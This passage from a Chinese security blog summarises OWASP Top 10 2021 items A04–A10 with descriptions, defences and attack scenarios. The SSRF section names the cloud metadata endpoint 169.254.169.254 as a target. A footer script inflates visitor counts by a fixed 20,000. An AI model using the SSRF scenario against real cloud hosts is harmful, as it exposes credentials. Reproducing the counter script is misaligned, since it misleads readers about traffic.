<h3 id="攻击场景示例-3"><a href="#攻击场景示例-3" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景 #1：</strong>凭证恢复工作流程可能包括“问答”，这是 NIST 800-63b、OWASP ASVS 和 OWASP Top 10 所禁止的。不能将问答作为多个人身份的证据可以知道答案，这就是为什么它们被禁止。此类代码应删除并替换为更安全的设计。</p>
<p><strong>场景#2：</strong>连锁影院允许团体预订折扣，并且在要求押金之前最多有 15 名参与者。攻击者可以对该流程进行威胁建模，并测试他们是否可以在几次请求中一次预订 600 个座位和所有电影院，从而造成巨大的收入损失。</p>
<p><strong>场景 #3：</strong>零售连锁店的电子商务网站没有针对由黄牛运行的机器人提供保护，这些机器人购买高端显卡以转售拍卖网站。这对视频卡制造商和零售连锁店主造成了可怕的宣传，并与无法以任何价格获得这些卡的爱好者之间产生了仇恨。仔细的反机器人设计和域逻辑规则，例如在可用性的几秒钟内进行的购买，可能会识别出不真实的购买并拒绝此类交易。</p>
<h2 id="TOP5-Security-Misconfiguration-安全配置错误"><a href="#TOP5-Security-Misconfiguration-安全配置错误" class="headerlink" title="TOP5 Security Misconfiguration 安全配置错误"></a>TOP5 Security Misconfiguration 安全配置错误</h2><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>比如存在许多默认的控制台在不同的URL下也没有进行禁用，默认的账号密码弱口令没进行更改。默认的配置没有进行修改被利用了</p>
<p>如果应用程序是：</p>
<ol>
<li>在应用程序堆栈的任何部分缺少适当的安全强化或对云服务的权限配置不正确。</li>
<li>启用或安装了不必要的功能（例如，不必要的端口、服务、页面、帐户或权限）。</li>
<li>默认帐户及其密码仍处于启用状态且未更改。</li>
<li>错误处理向用户显示堆栈跟踪或其他信息过多的错误消息。</li>
<li>对于升级的系统，最新的安全功能被禁用或未安全配置。</li>
<li>应用程序服务器、应用程序框架（例如，Struts、Spring、ASP.NET）、库、数据库等中的安全设置未设置为安全值。</li>
<li>服务器不发送安全标头或指令，或者它们未设置为安全值。</li>
<li>软件已过时或易受攻击（请参阅 A06:2021-易受攻击和过时的组件）。</li>
</ol>
<p>如果没有协调一致的、可重复的应用程序安全配置过程，系统将面临更高的风险。</p>
<h3 id="预防方式-4"><a href="#预防方式-4" class="headerlink" title="预防方式"></a>预防方式</h3><p>应实施安全安装过程，包括：</p>
<ol>
<li>可重复的强化过程使部署另一个适当锁定的环境变得快速而轻松。开发、QA 和生产环境都应配置相同，在每个环境中使用不同的凭据。这个过程应该是自动化的，以最大限度地减少设置新安全环境所需的工作。</li>
<li>一个没有任何不必要的功能、组件、文档和示例的最小平台。删除或不安装未使用的功能和框架。</li>
<li>作为补丁管理流程的一部分，审查和更新适用于所有安全说明、更新和补丁的配置的任务（请参阅 A06:2021-易受攻击和过时的组件）。查看云存储权限（例如，S3 存储桶权限）。</li>
<li>分段应用程序架构通过分段、容器化或云安全组 (ACL) 在组件或租户之间提供有效且安全的分离。</li>
<li>向客户端发送安全指令，例如安全标头。</li>
<li>验证配置和设置在所有环境中的有效性的自动化过程。</li>
</ol>
<h3 id="攻击场景示例-4"><a href="#攻击场景示例-4" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景#1：</strong>应用程序服务器带有未从生产服务器中删除的示例应用程序。这些示例应用程序具有攻击者用来破坏服务器的已知安全漏洞。假设这些应用程序之一是管理控制台，并且默认帐户未更改。在这种情况下，攻击者使用默认密码登录并接管。</p>
<p><strong>场景#2：</strong>服务器上没有禁用目录列表。攻击者发现他们可以简单地列出目录。攻击者找到并下载已编译的 Java 类，对其进行反编译和逆向工程以查看代码。然后攻击者发现应用程序中存在严重的访问控制缺陷。</p>
<p><strong>场景#3：</strong>应用服务器的配置允许将详细的错误消息（例如堆栈跟踪）返回给用户。这可能会暴露敏感信息或潜在缺陷，例如已知易受攻击的组件版本。</p>
<p><strong>场景#4：</strong>云服务提供商拥有其他 CSP 用户对 Internet 开放的默认共享权限。这允许访问存储在云存储中的敏感数据。</p>
<h2 id="TOP6-Vulnerable-and-Outdated-Components-易受攻击和过时的组件"><a href="#TOP6-Vulnerable-and-Outdated-Components-易受攻击和过时的组件" class="headerlink" title="TOP6 Vulnerable and Outdated Components 易受攻击和过时的组件"></a>TOP6 Vulnerable and Outdated Components 易受攻击和过时的组件</h2><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>易受攻击的组件是我们难以测试和评估风险的已知问题。</p>
<p>比如已经过时的版本组件，没有及时的打上补丁被人用Nday打了</p>
<p>你可能很脆弱：</p>
<ol>
<li>如果您不知道您使用的所有组件的版本（客户端和服务器端）。这包括您直接使用的组件以及嵌套的依赖项。</li>
<li>如果软件易受攻击、不受支持或已过期。这包括操作系统、Web/应用程序服务器、数据库管理系统 (DBMS)、应用程序、API 和所有组件、运行时环境和库。</li>
<li>如果您不定期扫描漏洞并订阅与您使用的组件相关的安全公告。</li>
<li>如果您没有以基于风险的方式及时修复或升级底层平台、框架和依赖项。这通常发生在修补是变更控制下的每月或每季度任务的环境中，使组织面临数天或数月不必要地暴露于固定漏洞的风险。</li>
<li>如果软件开发人员不测试更新、升级或修补的库的兼容性。</li>
<li>如果您不保护组件的配置（请参阅 A05:2021-安全配置错误）。</li>
</ol>
<h3 id="预防方式-5"><a href="#预防方式-5" class="headerlink" title="预防方式"></a>预防方式</h3><p>应该有一个补丁管理流程来：</p>
<ol>
<li>删除未使用的依赖项、不必要的功能、组件、文件和文档。</li>
<li>使用版本、OWASP Dependency Check、retire.js 等工具持续清点客户端和服务器端组件（例如框架、库）及其依赖项的版本。成分。使用软件组合分析工具来自动化该过程。订阅与您使用的组件相关的安全漏洞的电子邮件警报。</li>
<li>仅通过安全链接从官方来源获取组件。首选签名包以减少包含修改后的恶意组件的机会（请参阅 A08:2021-软件和数据完整性故障）。</li>
<li>监视未维护或未为旧版本创建安全补丁的库和组件。如果无法打补丁，请考虑部署虚拟补丁来监控、检测或防止发现的问题。</li>
</ol>
<p>每个组织都必须确保在应用程序或产品组合的生命周期内制定持续的监控、分类和应用更新或配置更改的计划。</p>
<h3 id="攻击场景示例-5"><a href="#攻击场景示例-5" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景#1：</strong>组件通常以与应用程序本身相同的权限运行，因此任何组件中的缺陷都可能导致严重影响。此类缺陷可能是偶然的（例如，编码错误）或有意的（例如，组件中的后门）。发现的一些可利用组件漏洞的示例是：</p>
<ul>
<li>CVE-2017-5638 是一个 Struts 2 远程代码执行漏洞，可以在服务器上执行任意代码，已被归咎于重大漏洞。</li>
<li>虽然物联网 (IoT) 通常很难或不可能修补，但修补它们的重要性可能很大（例如，生物医学设备）。</li>
</ul>
<p>有一些自动化工具可以帮助攻击者找到未打补丁或配置错误的系统。例如，Shodan IoT 搜索引擎可以帮助您找到仍然存在 2014 年 4 月修补的 Heartbleed 漏洞的设备。</p>
<h2 id="TOP7-Identification-and-Authentication-Failures-认证和授权失败"><a href="#TOP7-Identification-and-Authentication-Failures-认证和授权失败" class="headerlink" title="TOP7 Identification and Authentication Failures 认证和授权失败"></a>TOP7 Identification and Authentication Failures 认证和授权失败</h2><h3 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h3><p>​        确认用户的身份、身份验证和会话管理对于防止与身份验证相关的攻击至关重要。如果应用程序存在以下情况，则可能存在身份验证漏洞：</p>
<ol>
<li>允许自动攻击，例如撞库，其中攻击者拥有有效用户名和密码的列表。</li>
<li>允许蛮力或其他自动攻击。</li>
<li>允许使用默认密码、弱密码或众所周知的密码，例如“Password1”或“admin/admin”。</li>
<li>使用弱或无效的凭据恢复和忘记密码流程，例如无法确保安全的“基于知识的答案”。</li>
<li>使用纯文本、加密或弱散列密码（请参阅 A3:2017-敏感数据暴露）。</li>
<li>缺少或无效的多因素身份验证。</li>
<li>在 URL 中公开会话 ID（例如，URL 重写）。</li>
<li>成功登录后不要轮换会话 ID。</li>
<li>不会正确地使会话 ID 无效。用户会话或身份验证令牌（主要是单点登录 (SSO) 令牌）在注销或一段时间不活动期间未正确失效。</li>
</ol>
<p>没有及时的对用户进行注销，默认的密码没有更改，密码被爆破出来。</p>
<h3 id="预防方式-6"><a href="#预防方式-6" class="headerlink" title="预防方式"></a>预防方式</h3><ol>
<li>在可能的情况下，实施多因素身份验证以防止自动凭证填充、暴力破解和被盗凭证重用攻击。</li>
<li>不要使用任何默认凭据进行交付或部署，尤其是对于管理员用户。</li>
<li>实施弱密码检查，例如针对前 10,000 个最差密码列表测试新密码或更改的密码。</li>
<li>将密码长度、复杂性和轮换策略与 NIST 800-63b 的第 5.1.1 节中关于记忆秘密的指南或其他现代的、基于证据的密码策略保持一致。</li>
<li>通过对所有结果使用相同的消息，确保注册、凭据恢复和 API 路径能够抵御帐户枚举攻击。</li>
<li>限制或增加延迟失败的登录尝试。当检测到凭证填充、暴力破解或其他攻击时，记录所有故障并提醒管理员。</li>
<li>使用服务器端、安全、内置的会话管理器，在登录后生成新的高熵随机会话 ID。会话 ID 不应在 URL 中，安全存储，并在注销、空闲和绝对超时后失效。</li>
</ol>
<h3 id="攻击场景示例-6"><a href="#攻击场景示例-6" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景#1：</strong>凭证填充（使用已知密码列表）是一种常见的攻击。假设应用程序没有实施自动化威胁或凭证填充保护。在这种情况下，应用程序可以用作密码预言机来确定凭证是否有效。</p>
<p><strong>场景#2：</strong>大多数身份验证攻击是由于继续使用密码作为唯一因素而发生的。一经考虑，最佳实践、密码轮换和复杂性要求会鼓励用户使用和重复使用弱密码。建议组织按照 NIST 800-63 停止这些做法并使用多因素身份验证。</p>
<p><strong>场景 #3：</strong>应用程序会话超时设置不正确。用户使用公共计算机访问应用程序。用户没有选择“注销”，而是简单地关闭浏览器选项卡并走开。攻击者在一个小时后使用同一个浏览器，而用户仍然通过身份验证。</p>
<h2 id="TOP8-Software-and-Data-Integrity-Failures-软件和数据完整性故障"><a href="#TOP8-Software-and-Data-Integrity-Failures-软件和数据完整性故障" class="headerlink" title="TOP8 Software and Data Integrity Failures 软件和数据完整性故障"></a>TOP8 Software and Data Integrity Failures 软件和数据完整性故障</h2><h3 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h3><p>​        软件和数据完整性故障与不能防止完整性违规的代码和基础设施有关。例如，在对象或数据被编码或序列化为攻击者可以看到和修改的结构的情况下，很容易受到不安全的反序列化的影响。另一种形式是应用程序依赖来自不受信任的来源、存储库和内容交付网络 (CDN) 的插件、库或模块。不安全的 CI/CD 管道可能会导致未经授权的访问、恶意代码或系统受损。最后，许多应用程序现在包括自动更新功能，其中更新在没有充分完整性验证的情况下被下载并应用于以前受信任的应用程序。攻击者可能会上传自己的更新以分发并在所有安装上运行。</p>
<h3 id="预防方式-7"><a href="#预防方式-7" class="headerlink" title="预防方式"></a>预防方式</h3><ol>
<li>确保未签名或未加密的序列化数据不会在没有某种形式的完整性检查或数字签名的情况下发送到不受信任的客户端，以检测序列化数据的篡改或重放</li>
<li>通过签名或类似机制验证软件或数据来自预期来源</li>
<li>确保库和依赖项（例如 npm 或 Maven）使用受信任的存储库</li>
<li>确保使用软件供应链安全工具（例如 OWASP Dependency Check 或 OWASP CycloneDX）来验证组件不包含已知漏洞</li>
<li>确保您的 CI/CD 管道具有正确的配置和访问控制，以确保流经构建和部署过程的代码的完整性。</li>
</ol>
<h3 id="攻击场景示例-7"><a href="#攻击场景示例-7" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景 #1 不安全的反序列化：</strong> React 应用程序调用一组 Spring Boot 微服务。作为函数式程序员，他们试图确保他们的代码是不可变的。他们提出的解决方案是序列化用户状态并在每个请求中来回传递它。攻击者注意到“R00”Java 对象签名并使用 Java Serial Killer 工具在应用服务器上获取远程代码执行权。</p>
<p><strong>场景 #2 无需签名即可更新：</strong>许多家用路由器、机顶盒、设备固件和其他固件不通过签名固件验证更新。未签名固件是攻击者越来越多的目标，预计只会变得更糟。这是一个主要问题，因为很多时候除了在未来版本中修复并等待以前的版本过时之外，没有任何补救机制。</p>
<p><strong>场景#3 SolarWinds 恶意更新</strong>：众所周知，国家会攻击更新机制，最近的一次著名攻击是 SolarWinds Orion 攻击。开发该软件的公司拥有安全的构建和更新完整性流程。尽管如此，这些还是能够被破坏，并且在几个月的时间里，该公司向 18,000 多个组织分发了一个高度针对性的恶意更新，其中大约 100 个组织受到了影响。这是历史上此类性质最深远、最重大的违规行为之一。</p>
<h2 id="TOP9-Security-Logging-and-Monitoring-Failures-安全日志记录和监控失败"><a href="#TOP9-Security-Logging-and-Monitoring-Failures-安全日志记录和监控失败" class="headerlink" title="TOP9 Security Logging and Monitoring Failures 安全日志记录和监控失败"></a>TOP9 Security Logging and Monitoring Failures 安全日志记录和监控失败</h2><h3 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a><strong>描述</strong></h3><p>​        帮助检测、升级和响应主动违规行为。如果没有日志记录和监控，就无法检测到漏洞。任何时候都会发生日志记录、检测、监控和主动响应不足的情况：</p>
<ul>
<li>不记录可审计的事件，例如登录、失败登录和高价值交易。</li>
<li>警告和错误不会生成、不充分或不清楚的日志消息。</li>
<li>不会监控应用程序和 API 的日志是否存在可疑活动。</li>
<li>日志仅存储在本地。</li>
<li>适当的警报阈值和响应升级流程没有到位或有效。</li>
<li>DAST 工具（例如 OWASP ZAP）的渗透测试和扫描不会触发警报。</li>
<li>应用程序无法实时或接近实时地检测、升级或警告主动攻击。</li>
</ul>
<p>​        通过使用户或攻击者可以看到日志记录和警报事件，您很容易受到信息泄漏的影响（请参阅 A01:2021 – 损坏的访问控制）。</p>
<p>没有提供可靠的日志和进行数据可靠的保护。无法及时检测到被人攻击以及泄露信息</p>
<h3 id="预防方式-8"><a href="#预防方式-8" class="headerlink" title="预防方式"></a>预防方式</h3><p>开发人员应实施以下部分或全部控制措施，具体取决于应用程序的风险：</p>
<ol>
<li>确保所有登录、访问控制和服务器端输入验证失败都可以用足够的用户上下文来记录，以识别可疑或恶意帐户，并保留足够的时间以允许延迟取证分析。</li>
<li>确保以日志管理解决方案可以轻松使用的格式生成日志。</li>
<li>确保日志数据编码正确，以防止对日志或监控系统的注入或攻击。</li>
<li>确保高价值交易具有带有完整性控制的审计跟踪，以防止篡改或删除，例如仅追加数据库表或类似的。</li>
<li>DevSecOps 团队应该建立有效的监控和警报，以便快速检测和响应可疑活动。</li>
<li>制定或采用事件响应和恢复计划，例如 NIST 800-61r2 或更高版本。</li>
</ol>
<p>有商业和开源应用程序保护框架（例如 OWASP ModSecurity 核心规则集）和开源日志关联软件（例如 ELK 堆栈）具有自定义仪表板和警报功能。</p>
<h3 id="攻击场景示例-8"><a href="#攻击场景示例-8" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景#1：</strong>由于缺乏监控和日志记录，一家儿童健康计划提供商的网站运营商无法检测到违规行为。外部方通知健康计划提供者，攻击者访问并修改了超过 350 万儿童的数千份敏感健康记录。事后审查发现网站开发人员没有解决重大漏洞。由于没有对系统进行日志记录或监控，数据泄露可能自 2013 年以来一直在进行，时间超过七年。</p>
<p><strong>场景#2：</strong>印度一家大型航空公司发生数据泄露事件，涉及数百万乘客超过十年的个人数据，包括护照和信用卡数据。数据泄露发生在第三方云托管服务提供商处，该提供商在一段时间后将泄露事件通知了航空公司。</p>
<p><strong>场景 #3：</strong>一家主要的欧洲航空公司遭遇了 GDPR 可报告的违规行为。据报道，该漏洞是由攻击者利用的支付应用程序安全漏洞引起的，他们收集了超过 400,000 条客户支付记录。该航空公司因此被隐私监管机构罚款 2000 万英镑。</p>
<h2 id="TOP10-Server-Side-Request-Forgery-服务器请求伪造"><a href="#TOP10-Server-Side-Request-Forgery-服务器请求伪造" class="headerlink" title="TOP10 Server-Side Request Forgery 服务器请求伪造"></a>TOP10 Server-Side Request Forgery 服务器请求伪造</h2><h3 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h3><p>​        每当 Web 应用程序在未验证用户提供的 URL 的情况下获取远程资源时，就会出现 SSRF 缺陷。它允许攻击者强制应用程序将精心设计的请求发送到意外目的地，即使受到防火墙、VPN 或其他类型的网络 ACL 的保护也是如此。</p>
<p>​        随着现代 Web 应用程序为最终用户提供方便的功能，获取 URL 成为一种常见情况。因此，SSRF 的发病率正在增加。此外，由于云服务和架构的复杂性，SSRF 的严重性越来越高。</p>
<h3 id="预防方式-9"><a href="#预防方式-9" class="headerlink" title="预防方式"></a>预防方式</h3><p>开发人员可以通过实施以下部分或全部深度防御控制来防止 SSRF：</p>
<p><strong>服务器端请求伪造 (SSRF) - 从网络层</strong></p>
<ul>
<li>在单独的网络中分段远程资源访问功能以减少 SSRF 的影响</li>
<li>强制执行“默认拒绝”防火墙策略或网络访问控制规则，以阻止除基本 Intranet 流量之外的所有流量</li>
</ul>
<p><strong>服务器端请求伪造 (SSRF) - 从应用层：</strong></p>
<ul>
<li>清理和验证所有客户端提供的输入数据</li>
<li>使用肯定的允许列表强制执行 URL 架构、端口和目标</li>
<li>不要向客户端发送原始响应</li>
<li>禁用 HTTP 重定向</li>
<li>注意 URL 一致性，以避免 DNS 重新绑定和“检查时间、使用时间”(TOCTOU) 竞争条件等攻击</li>
</ul>
<p>不要通过使用拒绝列表或正则表达式来缓解 SSRF。攻击者拥有有效负载列表、工具和技能来绕过拒绝列表。</p>
<h3 id="攻击场景示例-9"><a href="#攻击场景示例-9" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景#1：</strong>端口扫描内部服务器。如果网络架构是未分段的，攻击者可以绘制内部网络，并根据连接结果或连接或拒绝 SSRF 负载连接所用的时间来确定内部服务器上的端口是打开还是关闭。</p>
<p><strong>场景#2：</strong>敏感数据暴露。攻击者可以访问本地文件，例如 或内部服务以获取敏感信息。</p>
<p><strong>场景#3：</strong>访问云服务的元数据存储。大多数云提供商都有元数据存储，例如<a target="_blank" rel="noopener" href="http://169.254.169.254/%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96%E5%85%83%E6%95%B0%E6%8D%AE%E6%9D%A5%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82">http://169.254.169.254/。攻击者可以读取元数据来获取敏感信息。</a></p>
<p><strong>场景#4：</strong>破坏内部服务——攻击者可以滥用内部服务进行进一步的攻击，例如远程代码执行 (RCE) 或拒绝服务 (DoS)。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">10vexh</p>
  <div class="site-description" itemprop="description">水至清则无鱼</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Sun Jan 02 2022 08:00:00 GMT+0800 (中国标准时间) – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">10vexh</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
